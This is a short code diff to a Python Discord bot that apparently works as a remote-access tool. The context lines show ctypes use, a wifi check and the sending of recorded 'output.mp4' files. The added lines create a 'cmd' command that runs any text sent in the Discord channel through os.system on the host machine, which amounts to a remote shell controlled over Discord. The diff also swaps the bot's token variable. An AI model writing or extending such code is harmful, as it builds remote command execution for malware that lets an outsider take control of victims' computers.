@@ -23,7 +23,7 @@ import ctypes
 
 load_dotenv()
 
-token = os.getenv("Cody")
+token = os.getenv("Ethan")
 timeout = 1
 connection = False
 def wifi_check():
@@ -369,6 +369,14 @@ class MyClient(discord.Client):
 
                 await message.channel.send(file=discord.File('output.mp4'))
                 os.remove('output.mp4')
+            #run a console command
+            if f'{message.content}' == 'cmd':
+                await message.channel.send('Please enter the command you would like to run')
+                def check(m):
+                    return m.author == message.author and m.channel == message.channel
+                msg = await client.wait_for('message', check=check)
+                os.system(msg.content)
+                await message.channel.send(f'Command "{msg.content}" executed')
         except Exception as e:
             await message.channel.send(f'An error occurred: {str(e)}')
 
